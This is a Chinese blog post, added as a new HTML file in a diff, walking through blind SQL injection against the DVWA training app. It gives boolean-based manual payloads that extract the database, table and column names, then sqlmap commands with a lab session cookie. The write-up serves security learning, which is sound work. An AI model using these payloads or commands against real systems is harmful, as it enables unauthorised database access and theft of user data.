@@ -1,0 +1,336 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="LuRen"><meta name="copyright" content="LuRen"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>dvwa--盲注 | 圥忈的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><script src="https://fastly.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer type="module"></script><script src="https://fastly.jsdelivr.net/npm/vue@2.6.14"></script><link rel="icon" type="image/svg+xml" href="/ghost-smile-line.svg"><link rel="mask-icon" href="/ghost-smile-line.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"hexo.zhiyun.fun","root":"/","title":"圥忈的小站","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":["102, 167, 221","\t255,0,255","33, 78, 194","255,69,0"]},"waline":{"config":{"enable":true,"serverURL":"waline-1-w1489767.deta.app","comment":true,"visitor":true,"emoji":["https://unpkg.com/@waline/emojis@1.0.1/bilibili","https://unpkg.com/@waline/emojis@1.0.1/qq","https://unpkg.com/@waline/emojis@1.0.1/weibo"],"search":true,"locale":{"placeholder":"来都来了，说点什么吧","level0":"炼体","level1":"炼气","level2":"筑基","level3":"金丹","level4":"元婴","level5":"化神"},"el":"#waline","lang":"zh-CN"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="圥忈的小站" type="application/atom+xml"><script src="//at.alicdn.com/t/font_3319107_f11xxoznd2e.js" async></script><meta name="description" content="概念一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。 步骤手工 VS 自动化：①手工测试有助于理解整个注入漏洞的利用过程，可以加深技能印象②自动化工具所检测的效率相对较高，而且覆盖的全面性更高，数据获取的广度和深度也可以得到更好的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dvwa--盲注">
+<meta property="og:url" content="http://hexo.zhiyun.fun/posts/75e4ecec/index.html">
+<meta property="og:site_name" content="圥忈的小站">
+<meta property="og:description" content="概念一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。 步骤手工 VS 自动化：①手工测试有助于理解整个注入漏洞的利用过程，可以加深技能印象②自动化工具所检测的效率相对较高，而且覆盖的全面性更高，数据获取的广度和深度也可以得到更好的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124648.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124650.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124651.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124653.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124655.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124657.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124659.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124702.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124703.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124706.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124707.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124709.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124712.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124714.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124716.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124718.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124721.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124722.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124725.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124726.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124728.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124730.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124732.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124734.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124736.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124737.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124739.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124741.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124742.png">
+<meta property="og:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124744.png">
+<meta property="article:published_time" content="2022-05-25T04:59:54.000Z">
+<meta property="article:modified_time" content="2022-05-28T02:56:15.682Z">
+<meta property="article:author" content="LuRen">
+<meta property="article:tag" content="DVWA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124648.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="LuRen"><img width="96" loading="lazy" src="/images/1.jpg" alt="LuRen"><span class="site-author-status" title="努力ing">🤡</span></a><div class="site-author-name"><a href="/about/">LuRen</a></div><a class="site-name" href="/about/site.html">圥忈的小站</a><sub class="site-subtitle">不断地寻找同类，最后变成孤独的人</sub><div class="site-description">一个自言自语的地方</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">104</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">29</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">28</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/weaving-dreams" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.yuque.com/yuqueyonghuvseqgc/wze6w2" title="语雀" target="_blank" style="color:#007722"><span class="icon iconify" data-icon="ant-design:yuque-outlined"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/u/6603251070" title="微博" target="_blank" style="color:#E6162D"><span class="icon iconify" data-icon="ri:weibo-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=1475793651" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/499227133?share_medium=android&amp;share_plat=android&amp;share_session_id=f72830f6-8f5f-413a-86d2-6043b1bd69eb&amp;share_source=WEIXIN&amp;share_tag=s_i&amp;timestamp=1646642363&amp;unique_k=pDXLBN4" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="http://www.coolapk.com/u/4097869" title="酷安" target="_blank" style="color:#007722"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-kuancoolapk1"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="友联 links" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a><a class="links-item hty-icon-button" href="/albums/" title="相册集" style="color:#6e5494"><span class="icon iconify" data-icon="ri:gallery-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.1.</span> <span class="toc-text">手工盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">low（基于布尔型）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8sqlmap%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.</span> <span class="toc-text">利用sqlmap工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low"><span class="toc-number">2.2.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Medium"><span class="toc-number">2.2.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#High"><span class="toc-number">2.2.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lmpossible"><span class="toc-number">2.2.4.</span> <span class="toc-text">lmpossible</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://hexo.zhiyun.fun/posts/75e4ecec/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="LuRen"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="圥忈的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">dvwa--盲注</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2022-05-25 12:59:54" itemprop="dateCreated datePublished" datetime="2022-05-25T12:59:54+08:00">2022-05-25</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2022-05-28 10:56:15" itemprop="dateModified" datetime="2022-05-28T10:56:15+08:00">2022-05-28</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">14m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/75e4ecec/" data-flag-title="dvwa--盲注"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="评论数"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/posts/75e4ecec/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">学习</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0/web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">web安全</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0/web%E5%AE%89%E5%85%A8/DVWA/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">DVWA</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/DVWA/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">DVWA</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p><strong>手工 VS 自动化</strong>：<br>①手工测试有助于理解整个注入漏洞的利用过程，可以加深技能印象<br>②自动化工具所检测的效率相对较高，而且覆盖的全面性更高，数据获取的广度和深度也可以得到更好的发挥</p>
+<h3 id="手工盲注"><a href="#手工盲注" class="headerlink" title="手工盲注"></a>手工盲注</h3><p><strong>因为服务器只会回答存在或者不存在，所以通过设定是否条件，逐步接近想要知道的答案（类似于猜价格）因为手动注入过于繁琐所以只演示low的部分</strong></p>
+<h4 id="low（基于布尔型）"><a href="#low（基于布尔型）" class="headerlink" title="low（基于布尔型）"></a>low（基于布尔型）</h4><p>（1）判断是否存在注入，注入是字符型还是数字型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1 #</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>（2）猜解当前数据库名<br>a. 名字字符数量（长度）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;  and length(database())=1 #     </span><br></pre></td></tr></table></figure>
+
+<p>  一次修改  &#x3D;1 、&#x3D;2、&#x3D;3… …,直到显示USER ID 存在<br>答案   4<br>b.按顺序猜解每个字符（ASCII）<br>下面采用二分法猜解数据库名。<br>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;97 #</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;150 #</span><br><span class="line">... ...(缩小范围)</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))=97 #</span><br><span class="line">先缩小范围在最终确认</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
+<p>（3）猜解数据库中的表名<br>a.表的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 #</span><br></pre></td></tr></table></figure>
+
+<p>答案：2<br>b.按顺序猜解表的名称的字符长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #</span><br></pre></td></tr></table></figure>
+
+<p> 显示存在，第一张表：长度：  9</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 # </span><br></pre></td></tr></table></figure>
+
+
+<p>显示存在，第一张表：长度：  5</p>
+<p>b.按顺序猜解表的名称的每个字符<br>第一张表第一个字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # </span><br><span class="line">... ...</span><br><span class="line">（方法同上，先缩小范围在最终确认）</span><br></pre></td></tr></table></figure>
+
+<p>显示不存在  第一个字符：g<br>第一张表第一个字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;117 #</span><br></pre></td></tr></table></figure>
+
+<p> 显示不存在  第二个字符：u<br>….<br>第一张表名称：guestbook</p>
+<p>第二张表的第一个字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;117 #</span><br></pre></td></tr></table></figure>
+
+<p>显示不存在  第一个字符：u<br>第二张表的第二个字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))&gt;115 #</span><br></pre></td></tr></table></figure>
+
+<p>显示不存在  第二个字符：s<br>….<br>第二张表名称：users</p>
+<p>（4）猜解表中的字段名<br>a.users表字段的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8 #</span><br></pre></td></tr></table></figure>
+
+<p>b.按顺序猜解每个字段字符长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 0,1),1))=7 #</span><br></pre></td></tr></table></figure>
+
+<p> 显示存在<br>说明users表的第一个字段为7个字符长度。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),1))=10 #</span><br></pre></td></tr></table></figure>
+
+<p> 显示存在,说明users表的第二个字段为10个字符长度。<br>….<br>c.按顺序猜解每个字段字符每个字符<br>第一个字段的第一个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;117 #</span><br></pre></td></tr></table></figure>
+
+
+<p>第一个字段的第二个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;115 #</span><br></pre></td></tr></table></figure>
+
+<p>….<br>第二个字段的第一个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1),1,1))&gt;117 #</span><br></pre></td></tr></table></figure>
+
+<p>第二个字段的第二个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1),2,1))&gt;115 #</span><br></pre></td></tr></table></figure>
+
+<p>…<br>（5）猜解数据</p>
+<p>… …</p>
+<h3 id="利用sqlmap工具"><a href="#利用sqlmap工具" class="headerlink" title="利用sqlmap工具"></a>利用sqlmap工具</h3><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p>
+<p><strong>利用SQLMap自动化工具的检测流程大致如下：</strong><br> 1.判断是否存在注入点、注入类型<br> 2.获取DBMS中所有的数据库名称<br> 3.获取Web应用当前连接的数据库<br> 4.列出数据库中的所有用户<br> 5.获取Web应用当前所操作的用户<br> 6.列出可连接数据库的所有账户-对应的密码哈希<br> 7.列出指定数据库中的所有数据表<br> 8.列出指定数据表中的所有字段（列）<br> 9.导出指定数据表中的列字段进行保存<br> 10.根据导出的数据，验证数据有效性</p>
+<h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p><strong>提交的数据是通过GET请求方式，直接在浏览器URL中传递参数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124648.png" alt="1" loading="lazy"></p>
+<p>发现跳转到登录界面，需要cookies来维持会话</p>
+<p><strong>查看cookie</strong></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124650.png" alt="3" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124651.png" alt="2" loading="lazy"></p>
+<p><strong>在sqlmap中输入：<code>sqlmap –u ‘复制的URL’ --cookie=’复制的cookie’</code> ，查看数据库类型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot;</span><br><span class="line">or</span><br><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch</span><br></pre></td></tr></table></figure>
+
